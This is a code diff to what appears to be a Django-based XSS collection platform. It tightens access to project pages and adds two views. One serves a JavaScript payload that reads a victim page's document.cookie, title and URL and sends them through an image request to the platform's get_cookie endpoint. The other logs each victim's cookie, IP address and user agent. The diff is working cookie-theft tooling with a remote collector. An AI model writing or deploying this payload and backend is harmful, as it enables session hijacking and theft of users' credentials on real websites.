@@ -22,10 +22,45 @@ def create_project(request):
         return render(request, "core/project_index.html", {"project": p})
 
 
+@login_required(login_url="/login/")
 def project_index(request):
     project_id = request.GET.get("id", "-1")
     try:
-        p = XssProject.objects.get(id=int(project_id))
+        p = XssProject.objects.get(pk=int(project_id), user=request.user)
     except XssProject.DoesNotExist:
         raise Http404
     return render(request, "core/project_index.html", {"project": p, "base_url": BASE_URL})
+
+
+def get_cookie(request):
+    project_id = request.GET.get("id", "-1")
+    title = request.GET.get("title")
+    url = request.GET.get("url")
+    cookie = request.GET.get("cookie")
+    if "HTTP_X_FORWARDED_FOR" in request.META:
+        ip = request.META['HTTP_X_FORWARDED_FOR']
+    else:
+        ip = request.META['REMOTE_ADDR']
+    user_agent=request.META.get("HTTP_USER_AGENT")
+    try:
+        p = XssProject.objects.get(pk=int(project_id))
+    except XssProject.DoesNotExist:
+        raise Http404
+    r = Record.objects.create(cookie=cookie, user_agent=user_agent, ip=ip, url=url, title=title)
+
+    p.records.add(r)
+    p.save()
+    return HttpResponse("success")
+
+
+def xss_js(request):
+    project_id = request.GET.get("id", "-1")
+    try:
+        p = XssProject.objects.get(pk=int(project_id))
+    except XssProject.DoesNotExist:
+        raise Http404
+    js = """
+    var x=new Image();
+    x.src=''+'%s'+'?a=info&id='+%s+'&title='+document.title+'&url='+escape(document.URL)+'&cookie='+escape(document.cookie);
+    """ % (BASE_URL + "get_cookie/", p.id)
+    return HttpResponse(js)
